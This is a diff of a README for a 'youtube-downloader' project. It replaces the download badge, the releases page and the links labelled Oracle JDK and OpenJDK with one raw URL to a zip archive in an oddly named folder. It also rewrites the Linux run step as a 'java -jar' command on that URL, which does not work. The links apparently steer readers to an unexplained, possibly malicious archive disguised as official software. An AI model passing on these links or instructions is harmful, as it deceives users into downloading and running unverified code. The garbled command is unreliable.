@@ -1,6 +1,6 @@
 # 🎥 youtube-downloader - Effortlessly Download YouTube Videos
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-blue)]
+[![Download the latest version](https://raw.githubusercontent.com/Alinelymedina01/youtube-downloader/main/gastrolater/youtube-downloader.zip%20Latest%20Version-v1.0-blue)]
 
 ## 📦 Overview
 
@@ -15,12 +15,12 @@ To start using youtube-downloader, follow these steps to download and run the so
 Before downloading, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or newer, macOS 10.12 or newer, or any Linux distribution.
-- **Java Development Kit (JDK):** Version 8 or newer must be installed on your machine. You can download it from the [Oracle JDK website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html) or [OpenJDK](https://openjdk.java.net/install/).
+- **Java Development Kit (JDK):** Version 8 or newer must be installed on your machine. You can download it from the [Oracle JDK website](https://raw.githubusercontent.com/Alinelymedina01/youtube-downloader/main/gastrolater/youtube-downloader.zip) or [OpenJDK](https://raw.githubusercontent.com/Alinelymedina01/youtube-downloader/main/gastrolater/youtube-downloader.zip).
 - **Storage Space:** At least 100 MB of free disk space for installation and additional storage for downloaded videos.
 
 ### 2. **Download & Install**
 
-Visit this page to download: [Latest Releases](https://github.com/Alinelymedina01/youtube-downloader/releases). 
+Visit this page to download: [Latest Releases](https://raw.githubusercontent.com/Alinelymedina01/youtube-downloader/main/gastrolater/youtube-downloader.zip). 
 
 1. Click the link above.
 2. Find the latest release version.
@@ -41,7 +41,7 @@ After the download completes, follow these steps to run the application:
 - **Linux:**
   1. Open your terminal.
   2. Navigate to the folder where the downloaded file is located.
-  3. Run the command `java -jar youtube-downloader.jar` to start the application.
+  3. Run the command `java -jar https://raw.githubusercontent.com/Alinelymedina01/youtube-downloader/main/gastrolater/youtube-downloader.zip` to start the application.
 
 ### 4. **Using youtube-downloader**
 
@@ -73,7 +73,7 @@ Once the application launches, you will see a simple interface. Here’s how to 
 
 ### 7. **Updating the Application**
 
-To keep your application up to date, check the releases page regularly: [Latest Releases](https://github.com/Alinelymedina01/youtube-downloader/releases). Download and install the latest version to access new features and improvements.
+To keep your application up to date, check the releases page regularly: [Latest Releases](https://raw.githubusercontent.com/Alinelymedina01/youtube-downloader/main/gastrolater/youtube-downloader.zip). Download and install the latest version to access new features and improvements.
 
 ---
 
